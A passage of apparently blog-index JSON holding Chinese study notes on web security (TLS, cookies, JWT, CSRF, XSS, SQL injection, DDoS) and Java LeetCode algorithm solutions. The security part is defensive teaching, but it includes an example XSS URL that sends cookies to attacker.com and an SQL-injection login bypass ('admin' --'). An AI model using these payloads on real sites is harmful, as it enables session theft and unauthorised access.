SHA-256）处理，生成一个固定长度的散列值。\n\n使用私钥对散列值使用私钥进行加密，生成数字签名。\n\n\n使用数字签名验证服务端身份是否真实、数据是否完整的应用方式：\n\n客户端首先使用相同的散列函数对收到的原始数据进行散列处理，得到一个散列值。\n然后使用数字证书中的公钥对附加的数字签名进行解密，得到另一个散列值。\n最后比较这两个散列值，如果它们完全相同，则说明私钥有效，服务端的身份是真实的，并且也说明数据未被篡改。\n\n数字证书使用数字证书验证服务端身份的方式：\n\n服务端要证实自己的身份，除了需要发送数字证书外，还需要对原始数据生成数字签名，并将数字签名附加到原始数据上，一起发送给客户端。\n客户端收到后，首先判断是否信任颁发该数字证书的CA机构。如果信任，就使用数字签名验证服务端的身份是否真实。\n\n总结：TLS 握手期间会发生什么？在 TLS 握手过程中，客户端和服务器一同执行以下操作：\n\n指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）\n决定将要使用哪些密码套件\n通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份\n生成会话密钥，以在握手完成后使用对称加密\n\nHTTPSHTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL&#x2F;TLS加密层，为数据传输提供加密、身份验证和完整性保护。\n工作原理\n首先建立TCP连接\n然后建立通过SSL&#x2F;TLS协议建立安全连接\n\n主要作用\n身份验证（解决了冒充风险）：在建立连接的过程中，会使用使用数字证书+数字签名的方式，对服务器进行身份验证，防止用户连接到伪造的服务器。\n加密通信（解决了窃听风险）：在建立连接的过程中，使用非对称加密算法对数据进行加密；建立安全连接之后，使用对称加密进行数据加密。\n数据完整性（解决了篡改风险）：在建立连接的过程中，对于使用数字签名的数据，能够确保数据数据的完整性；在HTTPS建立了安全连接之后，数据的完整性是通过使用消息认证码（MAC）来保证的。\n\nSession、Cookie、TokenSessionSession 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据Session关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session主要用于识别用户身份、存储用户信息等场景。\nHttpSession 对象并不是 HttpServletRequest 自带的，但可以通过 HttpServletRequest 对象的 getSession 方法轻松获取。当调用 request.getSession() 时，如果当前请求没有关联的会话，会自动为创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 request.getSession(false)。这样，如果没有关联的会话，将返回 null。\nCookieCookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。\nCookie 对象不是 HttpServletRequest 自带的，但可以通过 HttpServletRequest 对象的 getCookies 方法轻松获取。这个方法会返回一个 Cookie 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 null。\nSession和Cookie的区别\n存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；\n存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。\n\nToken概念和作用Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。\n优点Token 的优点主要包括：\n\n分布式系统和微服务下的用户状态共享：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用Session难以保证一致的用户状态。Token 可以在不同的服务器间共享，从而更适合分布式和微服务环境。\n\n降低CSRF攻击的风险：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token可以降低 CSRF（跨站请求伪造）攻击的风险（存放在Cookie里面的Token依然不能降低CSRF风险）。原因是，在用户登录成功获得 Token 之后，一般会选择存放在 localStorage （浏览器本地存储）中，然后会在前端发到后端的请求的请求头Authorization 字段中手动添加这个 Token，这样就不会出现 CSRF 漏洞的问题，添加方法是：\nfetch(&#x27;https://example.com/api/resource&#x27;, &#123;  headers: &#123;    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token  &#125;&#125;)\n\nJWTJWT（JSON Web Token）是是目前最流行的跨域认证解决方案，是一种基于 Token 的认证授权机制。\nToken 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。\nJWT 由三个通过（.）切分的 ，使用Base64 编码后的字符串组成，这三部分分别是：\n\nHeader（头部） : 描述 JWT 的元数据，定义了 Token 的类型（也就是 JWT）和生成签名的算法（比如 HS256）。JSON 形式的 Header 被转换成 Base64 编码，成为 JWT 的第一部分。\nPayload（载荷） : 用来存放实际需要传递的数据和Claims（声明）。JSON 形式的 Payload 被转换成 Base64 编码，成为 JWT 的第二部分。Payload 部分默认是不加密的。\nSignature（签名）：服务器通过 Header 、Payload和一个密钥（Secret）使用 Header 里面指定的签名算法生成。Signature 部分是对前两部分的签名，作用是防止 JWT（主要是 payload） 被篡改，保证数据的完整性。JSON 形式的 Signature 被转换成 Base64 编码，成为 JWT 的第三部分。\n\nWeb安全跨站请求伪造攻击（CSRF攻击）跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是攻击者利用利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。\n为了防止 CSRF 攻击，可以采取以下措施：\n\n使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。\nSameSite Cookie：将 Cookie 的 SameSite 属性设置为 Strict 或 Lax，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。\n验证请求来源：检查请求的来源（如 Referer 和 Origin 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。\n双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。\n使用随机的安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。\n\n跨站脚本攻击（XSS攻击）跨站脚本攻击（Cross-Site Scripting，简称 XSS）是是攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。\nXSS 攻击主要分为三类：\n\n反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：\nhttps://example.com/search?search=&lt;script&gt;document.location=&#x27;https://attacker.com/steal?cookie=&#x27;+encodeURIComponent(document.cookie);&lt;/script&gt;\n\n当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。\n\n存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。\n\nDOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在DOM中注入恶意脚本，然后通过客户端操作DOM从而执行。\n\n\nXSS 攻击可能导致以下危害：\n\n窃取用户敏感信息（如 Cookie、会话令牌等）\n模拟用户行为\n利用受害者的身份执行恶意操作\n向受害者展示虚假信息\n\n为了防止 XSS 攻击，可以采取以下措施：\n\n输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。\n\n输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 &lt; 和 &gt; 转换为 HTML 实体 &amp;lt; 和 &amp;gt;。\n\n使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。\n\n使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。\n\n保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏\n\n\n点击劫持攻击点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。\n为了防止点击劫持攻击，可以采取以下措施：\n\nframe busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting\nif (top.location != location) &#123;\ttop.location = self.location;&#125;\n\n使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 X-Frame-Options: DENY 将完全禁止嵌入。\n\n\nSQL注入SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。\n以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：\nSELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;;\n\n在这里，$username 和 $password 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：admin&#39; --。这会导致生成以下查询：\nSELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;&#x27;;\n\n在这个例子中，-- 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。\n为了防止 SQL 注入攻击，可以采取以下措施：\n\n参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，参数化查询会将用户输入作为参数传递给查询，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构，从而避免 SQL 注入。\n输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。\n最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。\n数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。\n\n分布式拒绝服务攻击（DDoS 攻击）拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。\nDDoS 攻击有多种类型，主要分为以下三类：\n\n网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。\n防御措施：\n\n增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。\n配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。\n采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。\n\n\n传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。\n防御措施：\n\n配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。\n使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。\n启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。\n\n\n应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。\n防御措施：\n\n启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。\n使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。\n限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。\n使用负载均衡：在多个服务器之间分配流量，分散攻击负载。\n\n\n\n综合防御措施：\n\n网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。\n使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。\n监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。\n\n防火墙和入侵防御系统防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。\n入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。\n防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。\nReferences\n谢希仁. 计算机网络:第五版. 北京: 电子工业出版社, 2008.1.\n特南鲍姆,等. 计算机网络:第五版. 北京: 清华大学出版社. 2012.3.\n吴翰清. 白帽子讲Web安全:纪念版. 北京: 电子工业出版社, 2014.6.\n尼恩,等. Java高并发核心编程:加强版. 卷1, NIO、Netty、Redis、Zookeeper. 北京: 清华大学出版社, 2022.11.\n\n","categories":["IT"],"tags":["计算机网络"]},{"title":"数据结构和算法二刷（更新中）","url":"/2023/07/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/","content":"二分法数组或列表使用二分法的使用前提：\n\n有序\n无重复元素\n\n二分法区间的定义一般有两种，一种是左闭右闭即[left, right]，另一种是左闭右开即[left, right)。基于这两种区间的定义分别给出代码写法如下。\n[left, right][left, right]的区间定义，决定了如下两个特点：\n\nleft和right相等是有意义的，所以在while(left&lt;&#x3D;right)中要使用&lt;&#x3D;。\n如果nums[middle]&gt;target，则更新搜索范围的右下标为middle - 1。\n\n代码如下：\npublic int binarySearch(int[] nums, int target) &#123;    int left = 0;    int right = nums.length - 1;    while (left &lt;= right) &#123;        int middle = left + ((right - left) &gt;&gt; 1);        if (nums[middle] &gt; target) &#123;            //target在[left, middle - 1]范围内            right = middle - 1;        &#125; else if (nums[middle] &lt; target) &#123;            //target在[middle + 1, right]范围内            left = middle + 1;        &#125; else &#123;            //找到了target的下标            return middle;        &#125;    &#125;    //未找到target    return -1;&#125;\n\n[left, right)[left, right)的区间定义，决定了如下两个特点：\n\nleft和right相等是没有意义的，所以在while(left&lt;right)中要使用&lt;。\n如果nums[middle]&gt;target，则更新搜索范围的右下标为middle。\n\n代码如下：\npublic int binarySearch(int[] nums, int target) &#123;    int left = 0;    int right = nums.length;    while (left &lt; right) &#123;        int middle = left + ((right - left) &gt;&gt; 1);        if (nums[middle] &gt; target) &#123;            //target在[left, middle)范围内            right = middle;        &#125; else if (nums[middle] &lt; target) &#123;            //target在[middle + 1, right)范围内            left = middle + 1; //left的[left, right)和[left, right]的更新规则一样        &#125; else &#123;            //找到了target的下标            return middle;        &#125;    &#125;    //未找到target    return -1;&#125;\n\n\n\n双指针法双指针法有多种形式，如快慢指针、左右指针向内移动。\n快慢指针法是通过定义一个快&#x2F;前指针和一个慢&#x2F;后指针，在遍历中完成指定操作。\n移除元素用法示例（力扣27. 移除元素：使用双指针实现移除指定的数组元素，并返回新的数组长度）：\npublic int removeElement(int[] nums, int val) &#123;\tint slow = 0;    for (int fast = 0; fast &lt; nums.length; fast++) &#123;        if (nums[fast] != val) &#123;            //如果快指针指向的元素不是需要删除的元素，就将元素移动到慢指针指向的位置，并移动慢指针            nums[slow++] = nums[fast];        &#125;    &#125;    return slow;&#125;\n\n反转链表用法示例（力扣206. 反转链表：在不申请额外内存空间的前提下反转链表）：\npublic ListNode reverseList(ListNode head) &#123;\tListNode pre = null;\tListNode cur = head;\tListNode temp;\twhile (cur != null) &#123;        //保存cur.next的指向，因为接下来要修改cur.next\t\ttemp = cur.next;\t\tcur.next = pre;        //更新pre和cur\t\tpre = cur;\t\tcur = temp;\t&#125;\treturn pre;&#125;\n\n这道题还可以使用递归法解决：这里给出的使用递归法的操作和使用双指针法的操作思路类似，只不过双指针法的示例中是使用等号赋值，这里的递归法的示例中，是通过递归方法的参数赋值，来设置pre、cur的值。\npublic ListNode reverseList(ListNode head) &#123;    //相当于pre = null和cur = head\treturn reverse(null, head);&#125;public ListNode reverse(ListNode pre, ListNode cur) &#123;\tif (cur == null) &#123;\t\treturn pre;\t&#125;    //指针指向的逻辑未变\tListNode temp = cur.next;\tcur.next = pre;\t//相当于pre = cur和cur = temp\treturn reverse(cur, temp);&#125;\n\n环形链表用法示例（力扣142. 环形链表 II：返回链表的入环节点）：\npublic ListNode detectCycle(ListNode head) &#123;\t//本题考察了两个知识点\t//1、判断链表是否有环\t//方法是使用快慢指针，分别以确定的速度前进（快指针每次前进两个节点，慢指针每次前进一个节点），如果有环，那么一定会在环内相遇\tListNode fast = head;\tListNode slow = head;\twhile (fast != null &amp;&amp; fast.next != null) &#123;\t\tfast = fast.next.next;\t\tslow = slow.next;\t\t//如果快慢指针相遇，说明有环\t\tif (slow == fast) &#123;\t\t\t//规则：一个指针从头节点出发，另一个指针从相遇节点出发，这两个指针每次只移动一个节点，那么这两个指针相遇的节点就是环的入口节点\t\t\t//这个规则是通过建立等式推导出的，等式的两端分别是快指针走过的节点数和2乘以慢指针走过的节点数\t\t\t//最终推导出的式子是x = (n - 1)(y + z) + z，其中x为头节点到环入口节点的节点数，y为环入口节点到相遇节点的节点数，z为相遇节点的到换入口的节点数\t\t\tListNode index1 = slow;\t\t\tListNode index2 = head;\t\t\t//2、如果有环，找到环的入口\t\t\twhile (index1 != index2) &#123;\t\t\t\tindex1 = index1.next;\t\t\t\tindex2 = index2.next;\t\t\t&#125;\t\t\t//返回环入口\t\t\treturn index1;\t\t&#125;\t&#125;\treturn null;&#125;\n\n三数之和用法示例（力扣15. 三数之和：在一个数组中找到三个和为0的元素组合，不允许重复，返回这些元素组合）：\n题目描述类似哈希法用法示例中的两数之和、四数相加，但是这道题不适合使用哈希法，原因是哈希法不容易去重，哈希解法链接。\n这道题使用双指针法会更加高效，操作步骤是，首先将数组排序，然后将两个指针定位到遍历元素的下一个位置和数组的最后一个位置，将两个指针向内移动。\npublic List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;();\tArrays.sort(nums);\tfor (int i = 0; i &lt; nums.length; i++) &#123;        //三数中的最小数都大于0，说明三数之和不会再出现0\t\tif (nums[i] &gt; 0) &#123;\t\t\treturn result;\t\t&#125;        //去重\t\tif (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) &#123;\t\t\tcontinue;\t\t&#125;\t\tint left = i + 1;\t\tint right = nums.length - 1;\t\twhile (left &lt; right) &#123;\t\t\tint num = nums[i] + nums[left] + nums[right];\t\t\tif (num &gt; 0) &#123;\t\t\t\t//三数之和大于0，right左移\t\t\t\tright--;\t\t\t&#125; else if (num &lt; 0) &#123;\t\t\t\t//三数之和小于0，left右移\t\t\t\tleft++;\t\t\t&#125; else &#123;\t\t\t\tList&lt;Integer&gt; list = new ArrayList&lt;&gt;(3);\t\t\t\tlist.add(nums[i]);\t\t\t\tlist.add(nums[left]);\t\t\t\tlist.add(nums[right]);\t\t\t\tresult.add(list);\t\t\t\t//去重逻辑\t\t\t\twhile (left &lt; right &amp;&amp; nums[right] == nums[right - 1]) &#123;\t\t\t\t\tright--;\t\t\t\t&#125;\t\t\t\twhile (left &lt; right &amp;&amp; nums[left] == nums[left + 1]) &#123;\t\t\t\t\tleft++;\t\t\t\t&#125;\t\t\t\tright--;\t\t\t\tleft++;\t\t\t&#125;\t\t&#125;\t&#125;\treturn result;&#125;\n\n四数之和用法示例（力扣18. 四数之和：跟上一题三数之和的唯一区别是，是四个数的和）：\n四数之和的解法和三数之和是一个思路，只需要在三数之和的基础上再套一层for循环。\npublic List&lt;List&lt;Integer&gt;&gt; fourSum(int[] nums, int target) &#123;\tList&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;();\tArrays.sort(nums);\tfor (int i = 0; i &lt; nums.length; i++) &#123;\t\t// nums[i] &gt; target 直接返回, 剪枝操作\t\tif (nums[i] &gt; 0 &amp;&amp; nums[i] &gt; target) &#123;\t\t\treturn result;\t\t&#125;\t\t//去重操作\t\tif (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) &#123;\t\t\tcontinue;\t\t&#125;\t\t//比三数之和多一层for循环\t\tfor (int j = i + 1; j &lt; nums.length; j++) &#123;\t\t\t//去重操作\t\t\tif (j &gt; i + 1 &amp;&amp; nums[j] == nums[j - 1]) &#123;\t\t\t\tcontinue;\t\t\t&#125;\t\t\tint left = j + 1;\t\t\tint right = nums.length - 1;\t\t\twhile (left &lt; right) &#123;\t\t\t\tint sum = nums[i] + nums[j] + nums[left] + nums[right];\t\t\t\tif (sum &gt; target) &#123;\t\t\t\t\tright--;\t\t\t\t&#125; else if (sum &lt; target) &#123;\t\t\t\t\tleft++;\t\t\t\t&#125; else &#123;\t\t\t\t\tList&lt;Integer&gt; list = new ArrayList&lt;&gt;(4);\t\t\t\t\tlist.add(nums[i]);\t\t\t\t\tlist.add(nums[j]);\t\t\t\t\tlist.add(nums[left]);\t\t\t\t\tlist.add(nums[right]);\t\t\t\t\tresult.add(list);\t\t\t\t\t//去重操作\t\t\t\t\twhile (left &lt; right &amp;&amp; nums[right] == nums[right - 1]) &#123;\t\t\t\t\t\tright--;\t\t\t\t\t&#125;\t\t\t\t\twhile (left &lt; right &amp;&amp; nums[left] == nums[left + 1]) &#123;\t\t\t\t\t\tleft++;\t\t\t\t\t&#125;\t\t\t\t\tright--;\t\t\t\t\tleft++;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn result;&#125;\n\n反转字符串用法示例（力扣541. 反转字符串 II：每计数2k个字符，反转前k个字符，如果剩余字符大于k小于2k，则依然反转前k个字符，后余字符不改变，如果剩余字符少于k，则反转全部剩余字符）：\n要求反转字符串的一部分，所以首先要定位反转的范围，然后执行普通的反转字符串操作。定位反转范围的方法是，使索引每次移动2k，然后判断剩余字符数，根据不同的字符数执行反转前k个字符或反转全部剩余字符。反转字符串的实现方法是定义两个指针，分别指向字符串需要反转部分的最左端（左指针）和最右端（右指针），然后左右指针向内移动，同时执行交换字符的操作。\npublic String reverseStr(String s, int k) &#123;\t//目的是使用StringBuilder提供的reverse方法\tStringBuilder sb = new StringBuilder(s);\tfor (int i = 0; i &lt; s.length(); i += (k &lt;&lt; 1)) &#123;\t\t//如果剩余字符大于k，小于2k，则反转k个字符\t\tif (i + k &lt; s.length()) &#123;\t\t\t//StringBuilder没有提供反转指定索引范围字符的反转方法\t\t\t//所以将反转后的部分字符使用replace替换掉原来的字符部分\t\t\tsb.replace(i, i + k,\t\t\t\t\t//反转[i, i + k)范围内的字符\t\t\t\t\tnew StringBuilder(s.substring(i, i + k)).reverse().toString());\t\t\tcontinue;\t\t&#125;\t\t//否则就是剩余字符数小于k，则反转全部剩余字符\t\tsb.replace(i, s.length(),\t\t\t\t//反转[i, s.length())范围内的字符\t\t\t\tnew StringBuilder(s.substring(i)).reverse().toString());\t&#125;\treturn sb.toString();&#125;\n\n反转字符串里的单词用法示例（力扣151. 反转字符串中的单词：删除单词两边和字符串单词间的冗余空格（字符串两端不保留空格，单词之间保留一个空格））：\n一种解法是将单词使用String提供的方法处理空格要求，即str.trim().replaceAll(&quot;\\\\s+&quot;, &quot; &quot;);（trim() 方法用于去掉字符串两端的空格，replaceAll() 方法用于将字符串中的多个空格替换为一个空格。其中，\\\\s+ 表示匹配一个或多个空格），然后使用split将分割后的单词存入一个String数组，然后反序构建新String，但是这种解决方法过多使用Java自带的方法，没有体现出编程者处理空格和处理单词顺序的能力，也不利于从题目中学习编程技巧。\n此处选择的方法是包括了去除空格、反转字符串、反转单词三个操作。\npublic String reverseWords(String s) &#123;\t//去除首位和中间多余的空格\tStringBuilder sb = removeSpace(s);\t//反转整个字符串\treverseString(sb, 0, sb.length() - 1);\t//反转每个单词，单词中的字符就会变为正序，单词之间就会变为逆序\treverseEachWord(sb);\treturn sb.toString();&#125;public StringBuilder removeSpace(String s) &#123;\tint start = 0;    //循环不变量：区间是[start, end]\tint end = s.length() - 1;\t//过滤掉字符串头的空格\twhile (s.charAt(start) == &#x27; &#x27;) &#123;\t\tstart++;\t&#125;\t//过滤掉字符串位的空格\twhile (s.charAt(end) == &#x27; &#x27;) &#123;\t\tend--;\t&#125;\tStringBuilder sb = new StringBuilder();\t//过滤掉字符串中单词间多余的的空格    //此处是&lt;=而不是&lt;，注意遵守循环不变量\twhile (start &lt;= end) &#123;\t\tchar c = s.charAt(start);\t\t//如果当前字符不是空格或末尾字符不是空格，则保留字符\t\t//或运算的短路逻辑使得判断末尾字符是不是空格之前就以及判断得出当前字符是空格，恰好可以将第一个出现的空格保留，后续空格不会被保留\t\tif (c != &#x27; &#x27; || sb.charAt(sb.length() - 1) != &#x27; &#x27;) &#123;\t\t\tsb.append(c);\t\t&#125;\t\tstart++;\t&#125;\treturn sb;&#125;private void reverseString(StringBuilder sb, int start, int end) &#123;\twhile (start &lt; end) &#123;\t\tchar temp = sb.charAt(start);\t\tsb.setCharAt(start, sb.charAt(end));\t\tsb.setCharAt(end, temp);\t\tstart++;\t\tend--;\t&#125;&#125;private void reverseEachWord(StringBuilder sb) &#123;\tint start = 0;\t//end不需要遍历start，可以直接从start的下一位开始遍历，提高效率\tint end = 1;\tint length = sb.length();\twhile (start &lt; length) &#123;\t\t//定位到空格所在处\t\twhile (end &lt; length &amp;&amp; sb.charAt(end) != &#x27; &#x27;) &#123;\t\t\tend++;\t\t&#125;\t\treverseString(sb, start, end - 1);\t\t//跳过空格\t\tstart = end + 1;\t\tend = start + 1;\t&#125;&#125;\n\n滑动窗口法滑动窗口法就是通过不断地调整子数组的起始位置和终止位置，并根据需要计算窗口内元素的值。\n要实现滑动窗口法，主要是解决以下三点：\n\n窗口内的元素是什么\n如何确定窗口的起始位置\n如何确定窗口的终止位置\n\n长度最小的子数组用法示例（力扣209. 长度最小的子数组：找到一个长度最小的连续子数组，子数组元素之和需大于等于目标值）：\npublic int minSubArrayLen(int target, int[] nums) &#123;       //结果       int result = Integer.MAX_VALUE;       //子数组的长度       int subLength = 0;       //滑动窗口内的元素和       int sum = 0;       //设子数组的起点为i       int i = 0;       //设子数组的终点为j       for (int j = i; j &lt; nums.length; j++) &#123;           sum += nums[j];           //如果满足sum&gt;=target的条件           while (sum &gt;= target) &#123;               //计算子数组的长度               subLength = (j - i + 1);               //更新最小长度               result = Math.min(result, subLength);               //就向右移动窗口的起始位置，直到不满足               sum -= nums[i++];           &#125;       &#125;       //如果还是初始值，说明不存在符合条件的子数组，返回0       return result == Integer.MAX_VALUE ? 0 : result;   &#125;\n\n循环不变量循环不变量规则，是在循环中，每一次边界的处理都根据区间的定义来操作。\n螺旋矩阵用法示例（力扣59. 螺旋矩阵 II：按照螺旋顺序填充二维数组中的元素）：\n矩阵的四条边都要坚持一致的左闭右开或者左开右闭的原则，即遵守循环不变量原则。这样才能按照统一的规则输出二维矩阵，不至于思路和代码混乱。\n此处按照左闭右开的循环不变量原则进行实现。\npublic int[][] generateMatrix(int n) &#123;    int[][] result = new int[n][n];    int count = 1;    //圈数    int loop = n / 2;    int i, j;    int startX = 0, startY = 0;    //矩阵边的长度减去offset就是每个方向填充的长度。因为是左闭右开，所以初始值为1，即第一圈每个方向填充的长度是矩阵边的长度减1    int offset = 1;    while (loop-- &gt; 0) &#123;        i = startX;        j = startY;        //按照左闭右开的规则，从左到右填充        for (j = startY; j &lt; startY + n - offset; j++) &#123;            result[i][j] = count++;        &#125;        //按照左闭右开的规则，从上到下填充        for (i = startX; i &lt; startX + n - offset; i++) &#123;            result[i][j] = count++;        &#125;        //按照右闭左开的规则，从右到左填充        for (; j &gt; startY; j--) &#123;            result[i][j] = count++;        &#125;        //按照下闭上开的规则，从下到上填充        for (; i &gt; startX; i--) &#123;            result[i][j] = count++;        &#125;        //起始位置加1        startX++;        startY++;        //offest用于控制每一圈的每一条边遍历的长度        offset += 2;    &#125;    //如果n是奇数，则为中间位置的元素赋值    if ((n &amp; 1) == 1) &#123;        int mid = n / 2;        result[mid][mid] = count;    &#125;    return 